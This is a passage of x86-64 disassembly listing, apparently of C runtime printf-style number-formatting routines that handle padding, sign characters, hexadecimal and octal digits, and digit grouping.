  406401:	48 89 f2             	mov    %rsi,%rdx
  406404:	b9 20 00 00 00       	mov    $0x20,%ecx
  406409:	e8 72 fb ff ff       	call   0x405f80
  40640e:	8b 46 0c             	mov    0xc(%rsi),%eax
  406411:	8d 50 ff             	lea    -0x1(%rax),%edx
  406414:	85 c0                	test   %eax,%eax
  406416:	89 56 0c             	mov    %edx,0xc(%rsi)
  406419:	7f e6                	jg     0x406401
  40641b:	48 8d 65 e8          	lea    -0x18(%rbp),%rsp
  40641f:	5b                   	pop    %rbx
  406420:	5e                   	pop    %rsi
  406421:	5f                   	pop    %rdi
  406422:	5d                   	pop    %rbp
  406423:	c3                   	ret
  406424:	48 89 fb             	mov    %rdi,%rbx
  406427:	e9 d4 fe ff ff       	jmp    0x406300
  40642c:	0f 1f 40 00          	nopl   0x0(%rax)
  406430:	41 c6 40 01 2c       	movb   $0x2c,0x1(%r8)
  406435:	49 8d 58 02          	lea    0x2(%r8),%rbx
  406439:	e9 c2 fe ff ff       	jmp    0x406300
  40643e:	66 90                	xchg   %ax,%ax
  406440:	f6 c4 01             	test   $0x1,%ah
  406443:	74 2b                	je     0x406470
  406445:	c6 03 2b             	movb   $0x2b,(%rbx)
  406448:	48 83 c3 01          	add    $0x1,%rbx
  40644c:	eb 8a                	jmp    0x4063d8
  40644e:	66 90                	xchg   %ax,%ax
  406450:	44 89 c8             	mov    %r9d,%eax
  406453:	ba 56 55 55 55       	mov    $0x55555556,%edx
  406458:	f7 ea                	imul   %edx
  40645a:	44 89 c8             	mov    %r9d,%eax
  40645d:	c1 f8 1f             	sar    $0x1f,%eax
  406460:	29 c2                	sub    %eax,%edx
  406462:	41 01 d1             	add    %edx,%r9d
  406465:	e9 00 fe ff ff       	jmp    0x40626a
  40646a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  406470:	a8 40                	test   $0x40,%al
  406472:	0f 84 60 ff ff ff    	je     0x4063d8
  406478:	c6 03 20             	movb   $0x20,(%rbx)
  40647b:	48 83 c3 01          	add    $0x1,%rbx
  40647f:	e9 54 ff ff ff       	jmp    0x4063d8
  406484:	89 c2                	mov    %eax,%edx
  406486:	81 e2 00 06 00 00    	and    $0x600,%edx
  40648c:	81 fa 00 02 00 00    	cmp    $0x200,%edx
  406492:	0f 85 03 ff ff ff    	jne    0x40639b
  406498:	8b 56 0c             	mov    0xc(%rsi),%edx
  40649b:	8d 4a ff             	lea    -0x1(%rdx),%ecx
  40649e:	85 d2                	test   %edx,%edx
  4064a0:	89 4e 0c             	mov    %ecx,0xc(%rsi)
  4064a3:	0f 8e 24 ff ff ff    	jle    0x4063cd
  4064a9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  4064b0:	c6 03 30             	movb   $0x30,(%rbx)
  4064b3:	8b 46 0c             	mov    0xc(%rsi),%eax
  4064b6:	48 83 c3 01          	add    $0x1,%rbx
  4064ba:	8d 50 ff             	lea    -0x1(%rax),%edx
  4064bd:	85 c0                	test   %eax,%eax
  4064bf:	89 56 0c             	mov    %edx,0xc(%rsi)
  4064c2:	7f ec                	jg     0x4064b0
  4064c4:	e9 01 ff ff ff       	jmp    0x4063ca
  4064c9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  4064d0:	49 89 cb             	mov    %rcx,%r11
  4064d3:	49 f7 db             	neg    %r11
  4064d6:	e9 c7 fd ff ff       	jmp    0x4062a2
  4064db:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  4064e0:	8b 4e 10             	mov    0x10(%rsi),%ecx
  4064e3:	85 c9                	test   %ecx,%ecx
  4064e5:	0f 84 7f fe ff ff    	je     0x40636a
  4064eb:	c6 03 30             	movb   $0x30,(%rbx)
  4064ee:	48 83 c3 01          	add    $0x1,%rbx
  4064f2:	e9 73 fe ff ff       	jmp    0x40636a
  4064f7:	48 89 fb             	mov    %rdi,%rbx
  4064fa:	e9 2e fe ff ff       	jmp    0x40632d
  4064ff:	90                   	nop
  406500:	55                   	push   %rbp
  406501:	48 89 e5             	mov    %rsp,%rbp
  406504:	41 56                	push   %r14
  406506:	41 55                	push   %r13
  406508:	41 54                	push   %r12
  40650a:	57                   	push   %rdi
  40650b:	56                   	push   %rsi
  40650c:	53                   	push   %rbx
  40650d:	48 83 ec 20          	sub    $0x20,%rsp
  406511:	b8 18 00 00 00       	mov    $0x18,%eax
  406516:	83 f9 6f             	cmp    $0x6f,%ecx
  406519:	4c 89 c7             	mov    %r8,%rdi
  40651c:	45 8b 40 10          	mov    0x10(%r8),%r8d
  406520:	41 89 ca             	mov    %ecx,%r10d
  406523:	8b 77 08             	mov    0x8(%rdi),%esi
  406526:	0f 95 c1             	setne  %cl
  406529:	44 0f b6 e9          	movzbl %cl,%r13d
  40652d:	48 89 d3             	mov    %rdx,%rbx
  406530:	49 89 d1             	mov    %rdx,%r9
  406533:	0f b6 c9             	movzbl %cl,%ecx
  406536:	ba 12 00 00 00       	mov    $0x12,%edx
  40653b:	46 8d 2c ed 07 00 00 	lea    0x7(,%r13,8),%r13d
  406542:	00 
  406543:	0f 44 d0             	cmove  %eax,%edx
  406546:	30 c0                	xor    %al,%al
  406548:	83 c1 03             	add    $0x3,%ecx
  40654b:	45 85 c0             	test   %r8d,%r8d
  40654e:	41 0f 49 c0          	cmovns %r8d,%eax
  406552:	f7 c6 00 10 00 00    	test   $0x1000,%esi
  406558:	44 8d 24 02          	lea    (%rdx,%rax,1),%r12d
  40655c:	74 0b                	je     0x406569
  40655e:	66 83 7f 20 00       	cmpw   $0x0,0x20(%rdi)
  406563:	0f 85 a7 01 00 00    	jne    0x406710
  406569:	44 8b 5f 0c          	mov    0xc(%rdi),%r11d
  40656d:	45 39 dc             	cmp    %r11d,%r12d
  406570:	44 89 d8             	mov    %r11d,%eax
  406573:	41 0f 4d c4          	cmovge %r12d,%eax
  406577:	48 98                	cltq
  406579:	48 83 c0 0f          	add    $0xf,%rax
  40657d:	48 83 e0 f0          	and    $0xfffffffffffffff0,%rax
  406581:	e8 ea f5 ff ff       	call   0x405b70
  406586:	48 29 c4             	sub    %rax,%rsp
  406589:	48 85 db             	test   %rbx,%rbx
  40658c:	4c 8d 64 24 20       	lea    0x20(%rsp),%r12
  406591:	0f 84 49 02 00 00    	je     0x4067e0
  406597:	45 89 d6             	mov    %r10d,%r14d
  40659a:	4c 89 e3             	mov    %r12,%rbx
  40659d:	41 83 e6 20          	and    $0x20,%r14d
  4065a1:	eb 0b                	jmp    0x4065ae
  4065a3:	49 d3 e9             	shr    %cl,%r9
  4065a6:	88 53 ff             	mov    %dl,-0x1(%rbx)
  4065a9:	4d 85 c9             	test   %r9,%r9
  4065ac:	74 23                	je     0x4065d1
  4065ae:	44 89 e8             	mov    %r13d,%eax
  4065b1:	48 83 c3 01          	add    $0x1,%rbx
  4065b5:	44 21 c8             	and    %r9d,%eax
  4065b8:	8d 50 30             	lea    0x30(%rax),%edx
  4065bb:	80 fa 39             	cmp    $0x39,%dl
  4065be:	7e e3                	jle    0x4065a3
  4065c0:	83 c0 37             	add    $0x37,%eax
  4065c3:	49 d3 e9             	shr    %cl,%r9
  4065c6:	44 09 f0             	or     %r14d,%eax
  4065c9:	4d 85 c9             	test   %r9,%r9
  4065cc:	88 43 ff             	mov    %al,-0x1(%rbx)
  4065cf:	75 dd                	jne    0x4065ae
  4065d1:	49 39 dc             	cmp    %rbx,%r12
  4065d4:	0f 84 06 02 00 00    	je     0x4067e0
  4065da:	45 85 c0             	test   %r8d,%r8d
  4065dd:	0f 8e 6d 01 00 00    	jle    0x406750
  4065e3:	4c 89 e0             	mov    %r12,%rax
  4065e6:	48 29 d8             	sub    %rbx,%rax
  4065e9:	41 01 c0             	add    %eax,%r8d
  4065ec:	45 85 c0             	test   %r8d,%r8d
  4065ef:	0f 8e 5b 01 00 00    	jle    0x406750
  4065f5:	41 8d 48 ff          	lea    -0x1(%r8),%ecx
  4065f9:	48 89 d8             	mov    %rbx,%rax
  4065fc:	48 8d 54 0b 01       	lea    0x1(%rbx,%rcx,1),%rdx
  406601:	c6 00 30             	movb   $0x30,(%rax)
  406604:	48 83 c0 01          	add    $0x1,%rax
  406608:	48 39 d0             	cmp    %rdx,%rax
  40660b:	75 f4                	jne    0x406601
  40660d:	48 8d 5c 0b 01       	lea    0x1(%rbx,%rcx,1),%rbx
  406612:	4c 39 e3             	cmp    %r12,%rbx
  406615:	0f 84 a5 01 00 00    	je     0x4067c0
  40661b:	89 d8                	mov    %ebx,%eax
  40661d:	44 29 e0             	sub    %r12d,%eax
  406620:	41 39 c3             	cmp    %eax,%r11d
  406623:	0f 8e 07 01 00 00    	jle    0x406730
  406629:	45 89 dd             	mov    %r11d,%r13d
  40662c:	41 29 c5             	sub    %eax,%r13d
  40662f:	45 85 ed             	test   %r13d,%r13d
  406632:	44 89 6f 0c          	mov    %r13d,0xc(%rdi)
  406636:	7e 28                	jle    0x406660
  406638:	41 83 fa 6f          	cmp    $0x6f,%r10d
  40663c:	74 15                	je     0x406653
  40663e:	f6 47 09 08          	testb  $0x8,0x9(%rdi)
  406642:	74 0f                	je     0x406653
  406644:	41 8d 45 fe          	lea    -0x2(%r13),%eax
  406648:	85 c0                	test   %eax,%eax
  40664a:	0f 8e a1 01 00 00    	jle    0x4067f1
  406650:	41 89 c5             	mov    %eax,%r13d
  406653:	44 8b 47 10          	mov    0x10(%rdi),%r8d
  406657:	45 85 c0             	test   %r8d,%r8d
  40665a:	0f 88 10 01 00 00    	js     0x406770
  406660:	41 8d 75 ff          	lea    -0x1(%r13),%esi
  406664:	41 83 fa 6f          	cmp    $0x6f,%r10d
  406668:	74 11                	je     0x40667b
  40666a:	f6 47 09 08          	testb  $0x8,0x9(%rdi)
  40666e:	74 0b                	je     0x40667b
  406670:	44 88 13             	mov    %r10b,(%rbx)
  406673:	c6 43 01 30          	movb   $0x30,0x1(%rbx)
  406677:	48 83 c3 02          	add    $0x2,%rbx
  40667b:	45 85 ed             	test   %r13d,%r13d
  40667e:	7e 3b                	jle    0x4066bb
  406680:	f6 47 09 04          	testb  $0x4,0x9(%rdi)
  406684:	75 35                	jne    0x4066bb
  406686:	41 89 f5             	mov    %esi,%r13d
  406689:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  406690:	41 83 ed 01          	sub    $0x1,%r13d
  406694:	48 89 fa             	mov    %rdi,%rdx
  406697:	b9 20 00 00 00       	mov    $0x20,%ecx
  40669c:	e8 df f8 ff ff       	call   0x405f80
  4066a1:	41 8d 45 01          	lea    0x1(%r13),%eax
  4066a5:	85 c0                	test   %eax,%eax
  4066a7:	7f e7                	jg     0x406690
  4066a9:	44 8d 6e ff          	lea    -0x1(%rsi),%r13d
  4066ad:	31 c0                	xor    %eax,%eax
  4066af:	85 f6                	test   %esi,%esi
  4066b1:	0f 49 c6             	cmovns %esi,%eax
  4066b4:	41 29 c5             	sub    %eax,%r13d
  4066b7:	41 8d 75 ff          	lea    -0x1(%r13),%esi
  4066bb:	4c 39 e3             	cmp    %r12,%rbx
  4066be:	76 14                	jbe    0x4066d4
  4066c0:	48 83 eb 01          	sub    $0x1,%rbx
  4066c4:	48 89 fa             	mov    %rdi,%rdx
  4066c7:	0f be 0b             	movsbl (%rbx),%ecx
  4066ca:	e8 b1 f8 ff ff       	call   0x405f80
  4066cf:	4c 39 e3             	cmp    %r12,%rbx
  4066d2:	75 ec                	jne    0x4066c0
  4066d4:	45 85 ed             	test   %r13d,%r13d
  4066d7:	7e 1e                	jle    0x4066f7
  4066d9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  4066e0:	83 ee 01             	sub    $0x1,%esi
  4066e3:	48 89 fa             	mov    %rdi,%rdx
  4066e6:	b9 20 00 00 00       	mov    $0x20,%ecx
  4066eb:	e8 90 f8 ff ff       	call   0x405f80
  4066f0:	8d 46 01             	lea    0x1(%rsi),%eax
  4066f3:	85 c0                	test   %eax,%eax
  4066f5:	7f e9                	jg     0x4066e0
  4066f7:	48 8d 65 d0          	lea    -0x30(%rbp),%rsp
  4066fb:	5b                   	pop    %rbx
  4066fc:	5e                   	pop    %rsi
  4066fd:	5f                   	pop    %rdi
  4066fe:	41 5c                	pop    %r12
  406700:	41 5d                	pop    %r13
  406702:	41 5e                	pop    %r14
  406704:	5d                   	pop    %rbp
  406705:	c3                   	ret
  406706:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  40670d:	00 00 00 
  406710:	44 89 e0             	mov    %r12d,%eax
  406713:	ba 56 55 55 55       	mov    $0x55555556,%edx
  406718:	f7 ea                	imul   %edx
  40671a:	44 89 e0             	mov    %r12d,%eax
  40671d:	c1 f8 1f             	sar    $0x1f,%eax
  406720:	29 c2                	sub    %eax,%edx
  406722:	41 01 d4             	add    %edx,%r12d
  406725:	e9 3f fe ff ff       	jmp    0x406569
  40672a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  406730:	c7 47 0c ff ff ff ff 	movl   $0xffffffff,0xc(%rdi)
  406737:	be fe ff ff ff       	mov    $0xfffffffe,%esi
  40673c:	41 bd ff ff ff ff    	mov    $0xffffffff,%r13d
  406742:	e9 1d ff ff ff       	jmp    0x406664
  406747:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  40674e:	00 00 
  406750:	41 83 fa 6f          	cmp    $0x6f,%r10d
  406754:	0f 85 b8 fe ff ff    	jne    0x406612
  40675a:	f6 47 09 08          	testb  $0x8,0x9(%rdi)
  40675e:	0f 84 ae fe ff ff    	je     0x406612
  406764:	c6 03 30             	movb   $0x30,(%rbx)
  406767:	48 83 c3 01          	add    $0x1,%rbx
  40676b:	e9 a2 fe ff ff       	jmp    0x406612
  406770:	8b 47 08             	mov    0x8(%rdi),%eax
  406773:	25 00 06 00 00       	and    $0x600,%eax
  406778:	3d 00 02 00 00       	cmp    $0x200,%eax
  40677d:	0f 85 dd fe ff ff    	jne    0x406660
  406783:	41 83 ed 01          	sub    $0x1,%r13d
  406787:	44 89 e8             	mov    %r13d,%eax
  40678a:	48 8d 54 03 01       	lea    0x1(%rbx,%rax,1),%rdx
  40678f:	48 89 d8             	mov    %rbx,%rax
  406792:	c6 00 30             	movb   $0x30,(%rax)
  406795:	48 83 c0 01          	add    $0x1,%rax
  406799:	48 39 d0             	cmp    %rdx,%rax
  40679c:	75 f4                	jne    0x406792
  40679e:	4d 63 ed             	movslq %r13d,%r13
  4067a1:	be fe ff ff ff       	mov    $0xfffffffe,%esi
  4067a6:	4a 8d 5c 2b 01       	lea    0x1(%rbx,%r13,1),%rbx
  4067ab:	41 bd ff ff ff ff    	mov    $0xffffffff,%r13d
  4067b1:	e9 ae fe ff ff       	jmp    0x406664
  4067b6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  4067bd:	00 00 00 
  4067c0:	44 8b 4f 10          	mov    0x10(%rdi),%r9d
  4067c4:	45 85 c9             	test   %r9d,%r9d
  4067c7:	0f 84 4e fe ff ff    	je     0x40661b
  4067cd:	c6 03 30             	movb   $0x30,(%rbx)
  4067d0:	48 83 c3 01          	add    $0x1,%rbx
  4067d4:	e9 42 fe ff ff       	jmp    0x40661b
  4067d9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  4067e0:	81 e6 ff f7 ff ff    	and    $0xfffff7ff,%esi
  4067e6:	4c 89 e3             	mov    %r12,%rbx
  4067e9:	89 77 08             	mov    %esi,0x8(%rdi)
  4067ec:	e9 e9 fd ff ff       	jmp    0x4065da
  4067f1:	41 8d 75 fd          	lea    -0x3(%r13),%esi
  4067f5:	41 89 c5             	mov    %eax,%r13d
  4067f8:	e9 73 fe ff ff       	jmp    0x406670
  4067fd:	0f 1f 00             	nopl   (%rax)
  406800:	55                   	push   %rbp
  406801:	48 89 e5             	mov    %rsp,%rbp
  406804:	41 54                	push   %r12
  406806:	57                   	push   %rdi
  406807:	56                   	push   %rsi
  406808:	53                   	push   %rbx
  406809:	48 83 ec 30          	sub    $0x30,%rsp
  40680d:	83 79 14 fd          	cmpl   $0xfffffffd,0x14(%rcx)
  406811:	48 89 ce             	mov    %rcx,%rsi
  406814:	0f 84 96 00 00 00    	je     0x4068b0
  40681a:	0f b7 51 18          	movzwl 0x18(%rcx),%edx
  40681e:	66 85 d2             	test   %dx,%dx
  406821:	74 5f                	je     0x406882
  406823:	48 63 46 14          	movslq 0x14(%rsi),%rax
  406827:	49 89 e4             	mov    %rsp,%r12
  40682a:	48 83 c0 0f          	add    $0xf,%rax
  40682e:	48 83 e0 f0          	and    $0xfffffffffffffff0,%rax
  406832:	e8 39 f3 ff ff       	call   0x405b70
  406837:	48 29 c4             	sub    %rax,%rsp
  40683a:	4c 8d 45 dc          	lea    -0x24(%rbp),%r8
  40683e:	c7 45 dc 00 00 00 00 	movl   $0x0,-0x24(%rbp)
  406845:	48 8d 5c 24 20       	lea    0x20(%rsp),%rbx
  40684a:	48 89 d9             	mov    %rbx,%rcx
  40684d:	e8 1e 2c 00 00       	call   0x409470
  406852:	85 c0                	test   %eax,%eax
  406854:	7e 4a                	jle    0x4068a0
  406856:	8d 40 ff             	lea    -0x1(%rax),%eax
  406859:	48 8d 7c 03 01       	lea    0x1(%rbx,%rax,1),%rdi
  40685e:	66 90                	xchg   %ax,%ax
  406860:	0f be 0b             	movsbl (%rbx),%ecx
  406863:	48 89 f2             	mov    %rsi,%rdx
  406866:	48 83 c3 01          	add    $0x1,%rbx
  40686a:	e8 11 f7 ff ff       	call   0x405f80
  40686f:	48 39 fb             	cmp    %rdi,%rbx
  406872:	75 ec                	jne    0x406860
  406874:	4c 89 e4             	mov    %r12,%rsp
  406877:	48 8d 65 e0          	lea    -0x20(%rbp),%rsp
  40687b:	5b                   	pop    %rbx
  40687c:	5e                   	pop    %rsi
  40687d:	5f                   	pop    %rdi
  40687e:	41 5c                	pop    %r12
  406880:	5d                   	pop    %rbp
  406881:	c3                   	ret
  406882:	48 89 f2             	mov    %rsi,%rdx
  406885:	b9 2e 00 00 00       	mov    $0x2e,%ecx
  40688a:	e8 f1 f6 ff ff       	call   0x405f80
  40688f:	90                   	nop
  406890:	48 8d 65 e0          	lea    -0x20(%rbp),%rsp
  406894:	5b                   	pop    %rbx
  406895:	5e                   	pop    %rsi
  406896:	5f                   	pop    %rdi
  406897:	41 5c                	pop    %r12
  406899:	5d                   	pop    %rbp
  40689a:	c3                   	ret
  40689b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  4068a0:	48 89 f2             	mov    %rsi,%rdx
  4068a3:	b9 2e 00 00 00       	mov    $0x2e,%ecx
  4068a8:	e8 d3 f6 ff ff       	call   0x405f80
  4068ad:	eb c5                	jmp    0x406874
  4068af:	90                   	nop
  4068b0:	c7 45 dc 00 00 00 00 	movl   $0x0,-0x24(%rbp)
  4068b7:	e8 14 41 00 00       	call   0x40a9d0
  4068bc:	48 8b 10             	mov    (%rax),%rdx
  4068bf:	4c 8d 4d dc          	lea    -0x24(%rbp),%r9
  4068c3:	48 8d 4d da          	lea    -0x26(%rbp),%rcx
  4068c7:	41 b8 10 00 00 00    	mov    $0x10,%r8d
  4068cd:	e8 4e 2e 00 00       	call   0x409720
  4068d2:	85 c0                	test   %eax,%eax
  4068d4:	7e 10                	jle    0x4068e6
  4068d6:	0f b7 55 da          	movzwl -0x26(%rbp),%edx
  4068da:	66 89 56 18          	mov    %dx,0x18(%rsi)
  4068de:	89 46 14             	mov    %eax,0x14(%rsi)
  4068e1:	e9 38 ff ff ff       	jmp    0x40681e
  4068e6:	0f b7 56 18          	movzwl 0x18(%rsi),%edx
  4068ea:	eb f2                	jmp    0x4068de
  4068ec:	0f 1f 40 00          	nopl   0x0(%rax)
  4068f0:	41 54                	push   %r12
  4068f2:	55                   	push   %rbp
  4068f3:	57                   	push   %rdi
  4068f4:	56                   	push   %rsi
  4068f5:	53                   	push   %rbx
  4068f6:	48 83 ec 20          	sub    $0x20,%rsp
  4068fa:	44 89 c7             	mov    %r8d,%edi
  4068fd:	89 cd                	mov    %ecx,%ebp
  4068ff:	48 89 d6             	mov    %rdx,%rsi
  406902:	85 ff                	test   %edi,%edi
  406904:	4c 89 cb             	mov    %r9,%rbx
  406907:	45 8b 41 0c          	mov    0xc(%r9),%r8d
  40690b:	0f 8e 8f 02 00 00    	jle    0x406ba0
  406911:	44 39 c7             	cmp    %r8d,%edi
  406914:	0f 8d 36 01 00 00    	jge    0x406a50
  40691a:	41 29 f8             	sub    %edi,%r8d
  40691d:	45 89 41 0c          	mov    %r8d,0xc(%r9)
  406921:	45 85 c0             	test   %r8d,%r8d
  406924:	0f 88 26 01 00 00    	js     0x406a50
  40692a:	8b 43 10             	mov    0x10(%rbx),%eax
  40692d:	44 39 c0             	cmp    %r8d,%eax
  406930:	0f 8d 1a 01 00 00    	jge    0x406a50
  406936:	41 29 c0             	sub    %eax,%r8d
  406939:	45 85 c0             	test   %r8d,%r8d
  40693c:	44 89 43 0c          	mov    %r8d,0xc(%rbx)
  406940:	0f 8e 17 01 00 00    	jle    0x406a5d
  406946:	85 c0                	test   %eax,%eax
  406948:	0f 8e e6 02 00 00    	jle    0x406c34
  40694e:	41 83 e8 01          	sub    $0x1,%r8d
  406952:	85 ff                	test   %edi,%edi
  406954:	44 89 43 0c          	mov    %r8d,0xc(%rbx)
  406958:	0f 8f 07 01 00 00    	jg     0x406a65
  40695e:	66 90                	xchg   %ax,%ax
  406960:	45 85 c0             	test   %r8d,%r8d
  406963:	7e 21                	jle    0x406986
  406965:	85 ed                	test   %ebp,%ebp
  406967:	0f 84 d7 01 00 00    	je     0x406b44
  40696d:	41 83 e8 01          	sub    $0x1,%r8d
  406971:	45 85 c0             	test   %r8d,%r8d
  406974:	44 89 43 0c          	mov    %r8d,0xc(%rbx)
  406978:	74 0c                	je     0x406986
  40697a:	8b 43 08             	mov    0x8(%rbx),%eax
  40697d:	f6 c4 06             	test   $0x6,%ah
  406980:	0f 84 57 01 00 00    	je     0x406add
  406986:	85 ed                	test   %ebp,%ebp
  406988:	0f 85 64 01 00 00    	jne    0x406af2
  40698e:	8b 43 08             	mov    0x8(%rbx),%eax
  406991:	f6 c4 01             	test   $0x1,%ah
  406994:	0f 85 26 02 00 00    	jne    0x406bc0
  40699a:	a8 40                	test   $0x40,%al
  40699c:	0f 85 80 02 00 00    	jne    0x406c22
  4069a2:	8b 53 0c             	mov    0xc(%rbx),%edx
  4069a5:	85 d2                	test   %edx,%edx
  4069a7:	7e 13                	jle    0x4069bc
  4069a9:	8b 43 08             	mov    0x8(%rbx),%eax
  4069ac:	25 00 06 00 00       	and    $0x600,%eax
  4069b1:	3d 00 02 00 00       	cmp    $0x200,%eax
  4069b6:	0f 84 16 02 00 00    	je     0x406bd2
  4069bc:	85 ff                	test   %edi,%edi
  4069be:	bd 56 55 55 55       	mov    $0x55555556,%ebp
  4069c3:	4c 8d 63 20          	lea    0x20(%rbx),%r12
  4069c7:	0f 8e 43 02 00 00    	jle    0x406c10
  4069cd:	0f 1f 00             	nopl   (%rax)
  4069d0:	0f b6 06             	movzbl (%rsi),%eax
  4069d3:	b9 30 00 00 00       	mov    $0x30,%ecx
  4069d8:	84 c0                	test   %al,%al
  4069da:	74 07                	je     0x4069e3
  4069dc:	0f be c8             	movsbl %al,%ecx
  4069df:	48 83 c6 01          	add    $0x1,%rsi
  4069e3:	48 89 da             	mov    %rbx,%rdx
  4069e6:	e8 95 f5 ff ff       	call   0x405f80
  4069eb:	83 ef 01             	sub    $0x1,%edi
  4069ee:	0f 85 10 01 00 00    	jne    0x406b04
  4069f4:	8b 43 10             	mov    0x10(%rbx),%eax
  4069f7:	85 c0                	test   %eax,%eax
  4069f9:	0f 8e 61 01 00 00    	jle    0x406b60
  4069ff:	48 89 d9             	mov    %rbx,%rcx
  406a02:	e8 f9 fd ff ff       	call   0x406800
  406a07:	85 ff                	test   %edi,%edi
  406a09:	8b 43 10             	mov    0x10(%rbx),%eax
  406a0c:	74 23                	je     0x406a31
  406a0e:	e9 63 01 00 00       	jmp    0x406b76
  406a13:	0f b6 06             	movzbl (%rsi),%eax
  406a16:	b9 30 00 00 00       	mov    $0x30,%ecx
  406a1b:	84 c0                	test   %al,%al
  406a1d:	74 07                	je     0x406a26
  406a1f:	0f be c8             	movsbl %al,%ecx
  406a22:	48 83 c6 01          	add    $0x1,%rsi
  406a26:	48 89 da             	mov    %rbx,%rdx
  406a29:	e8 52 f5 ff ff       	call   0x405f80
  406a2e:	8b 43 10             	mov    0x10(%rbx),%eax
  406a31:	8d 50 ff             	lea    -0x1(%rax),%edx
  406a34:	85 c0                	test   %eax,%eax
  406a36:	89 53 10             	mov    %edx,0x10(%rbx)
  406a39:	7f d8                	jg     0x406a13
  406a3b:	48 83 c4 20          	add    $0x20,%rsp
  406a3f:	5b                   	pop    %rbx
  406a40:	5e                   	pop    %rsi
  406a41:	5f                   	pop    %rdi
  406a42:	5d                   	pop    %rbp
  406a43:	41 5c                	pop    %r12
  406a45:	c3                   	ret
  406a46:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  406a4d:	00 00 00 
  406a50:	c7 43 0c ff ff ff ff 	movl   $0xffffffff,0xc(%rbx)
  406a57:	41 b8 ff ff ff ff    	mov    $0xffffffff,%r8d
  406a5d:	85 ff                	test   %edi,%edi
  406a5f:	0f 8e fb fe ff ff    	jle    0x406960
  406a65:	f6 43 09 10          	testb  $0x10,0x9(%rbx)
  406a69:	0f 84 f1 fe ff ff    	je     0x406960
  406a6f:	66 83 7b 20 00       	cmpw   $0x0,0x20(%rbx)
  406a74:	0f 84 e6 fe ff ff    	je     0x406960
  406a7a:	8d 4f 02             	lea    0x2(%rdi),%ecx
  406a7d:	ba 56 55 55 55       	mov    $0x55555556,%edx
  406a82:	89 c8                	mov    %ecx,%eax
  406a84:	c1 f9 1f             	sar    $0x1f,%ecx
  406a87:	f7 ea                	imul   %edx
  406a89:	29 ca                	sub    %ecx,%edx
  406a8b:	83 fa 01             	cmp    $0x1,%edx
  406a8e:	0f 8e cc fe ff ff    	jle    0x406960
  406a94:	45 85 c0             	test   %r8d,%r8d
  406a97:	0f 8e e9 fe ff ff    	jle    0x406986
  406a9d:	44 89 c0             	mov    %r8d,%eax
  406aa0:	29 d0                	sub    %edx,%eax
  406aa2:	83 c0 01             	add    $0x1,%eax
  406aa5:	eb 12                	jmp    0x406ab9
  406aa7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  406aae:	00 00 
  406ab0:	45 85 c0             	test   %r8d,%r8d
  406ab3:	0f 84 8c 01 00 00    	je     0x406c45
  406ab9:	41 83 e8 01          	sub    $0x1,%r8d
  406abd:	41 39 c0             	cmp    %eax,%r8d
  406ac0:	75 ee                	jne    0x406ab0
  406ac2:	44 89 43 0c          	mov    %r8d,0xc(%rbx)
  406ac6:	e9 95 fe ff ff       	jmp    0x406960
  406acb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  406ad0:	48 89 da             	mov    %rbx,%rdx
  406ad3:	b9 20 00 00 00       	mov    $0x20,%ecx
  406ad8:	e8 a3 f4 ff ff       	call   0x405f80
  406add:	8b 43 0c             	mov    0xc(%rbx),%eax
  406ae0:	8d 50 ff             	lea    -0x1(%rax),%edx
  406ae3:	85 c0                	test   %eax,%eax
  406ae5:	89 53 0c             	mov    %edx,0xc(%rbx)
  406ae8:	7f e6                	jg     0x406ad0
  406aea:	85 ed                	test   %ebp,%ebp
  406aec:	0f 84 9c fe ff ff    	je     0x40698e
  406af2:	48 89 da             	mov    %rbx,%rdx
  406af5:	b9 2d 00 00 00       	mov    $0x2d,%ecx
  406afa:	e8 81 f4 ff ff       	call   0x405f80
  406aff:	e9 9e fe ff ff       	jmp    0x4069a2
  406b04:	f6 43 09 10          	testb  $0x10,0x9(%rbx)
  406b08:	0f 84 c2 fe ff ff    	je     0x4069d0
  406b0e:	66 83 7b 20 00       	cmpw   $0x0,0x20(%rbx)
  406b13:	0f 84 b7 fe ff ff    	je     0x4069d0
  406b19:	89 f8                	mov    %edi,%eax
  406b1b:	f7 ed                	imul   %ebp
  406b1d:	89 f8                	mov    %edi,%eax
  406b1f:	c1 f8 1f             	sar    $0x1f,%eax
  406b22:	29 c2                	sub    %eax,%edx
  406b24:	8d 04 52             	lea    (%rdx,%rdx,2),%eax
  406b27:	39 c7                	cmp    %eax,%edi
  406b29:	0f 85 a1 fe ff ff    	jne    0x4069d0
  406b2f:	49 89 d8             	mov    %rbx,%r8
  406b32:	ba 01 00 00 00       	mov    $0x1,%edx
  406b37:	4c 89 e1             	mov    %r12,%rcx
  406b3a:	e8 a1 f4 ff ff       	call   0x405fe0
  406b3f:	e9 8c fe ff ff       	jmp    0x4069d0
  406b44:	8b 43 08             	mov    0x8(%rbx),%eax
  406b47:	a9 c0 01 00 00       	test   $0x1c0,%eax
  406b4c:	0f 84 2b fe ff ff    	je     0x40697d
  406b52:	e9 16 fe ff ff       	jmp    0x40696d
  406b57:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  406b5e:	00 00 
  406b60:	f6 43 09 08          	testb  $0x8,0x9(%rbx)
  406b64:	0f 85 95 fe ff ff    	jne    0x4069ff
  406b6a:	85 ff                	test   %edi,%edi
  406b6c:	0f 1f 40 00          	nopl   0x0(%rax)
  406b70:	0f 84 bb fe ff ff    	je     0x406a31
  406b76:	01 f8                	add    %edi,%eax
  406b78:	89 43 10             	mov    %eax,0x10(%rbx)
  406b7b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  406b80:	48 89 da             	mov    %rbx,%rdx
  406b83:	b9 30 00 00 00       	mov    $0x30,%ecx
  406b88:	e8 f3 f3 ff ff       	call   0x405f80
